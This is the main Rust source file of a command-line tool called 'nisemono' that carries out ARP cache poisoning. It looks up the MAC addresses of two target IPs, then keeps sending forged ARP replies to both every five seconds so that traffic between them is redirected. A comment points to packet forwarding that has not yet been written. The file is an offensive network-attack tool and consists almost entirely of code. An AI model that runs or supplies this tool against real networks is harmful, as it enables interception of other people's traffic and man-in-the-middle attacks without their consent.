mod net;
mod ui;
use ansi_term::{Color, Style};
use net::arp::*;
use net::*;
use std::env::args;
use std::{thread, time};

fn get_mac(target_ip: [u8; 4]) -> [u8; 6] {
    let mut socket = utils::build_socket().unwrap();
    request::send(&mut socket, &target_ip);
    request::get_target_mac(&mut socket, &target_ip)
}

fn arp_cache_poisoning(target_a_ip: [u8; 4], target_b_ip: [u8; 4], target_a_mac: [u8; 6], target_b_mac: [u8; 6]) {
    let mut socket = utils::build_socket().unwrap();
    println!("{}", Color::Red.bold().paint("starting the ARP cache poisoning "));
    loop {
        reply::send(&mut socket, &target_a_ip, &target_a_mac, &target_b_ip);
        reply::send(&mut socket, &target_b_ip, &target_b_mac, &target_a_ip);
        thread::sleep(time::Duration::from_secs(5));
    }
}

fn main() {
    ui::print_banner();

    if let Err(e) = utils::build_socket() {
        eprintln!("{} {}", Color::Red.bold().paint("error:"), e);
        return;
    }

    if args().len() == 3 {
        let target_a_ip = args().nth(1).unwrap();
        let target_b_ip = args().nth(2).unwrap();

        let invalid_ips = utils::is_valid(&target_a_ip, &target_b_ip);
        if invalid_ips.len() == 0 {
            let target_a_ip = utils::parse_ip(&target_a_ip);
            let target_b_ip = utils::parse_ip(&target_b_ip);

            print!("{}", Color::Green.bold().paint("getting MAC addresses "));
            let thread_a = thread::spawn(move || get_mac(target_a_ip.clone()));
            let thread_b = thread::spawn(move || get_mac(target_b_ip.clone()));
            let target_a_mac = thread_a.join().unwrap();
            let target_b_mac = thread_b.join().unwrap();
            println!("{}", Color::Green.paint(" "));

            thread::spawn(move || arp_cache_poisoning(target_a_ip.clone(), target_b_ip.clone(), target_a_mac.clone(), target_b_mac.clone())).join().unwrap();

            // forwarding thread
        } else {
            for ip in invalid_ips {
                eprintln!("{} invalid IP address => {}", Color::Red.bold().paint("error:"), Style::new().bold().paint(ip));
            }
        }
    } else {
        eprintln!("usage: sudo ./nisemono <target_IP> <other_target_IP>");
    }
}
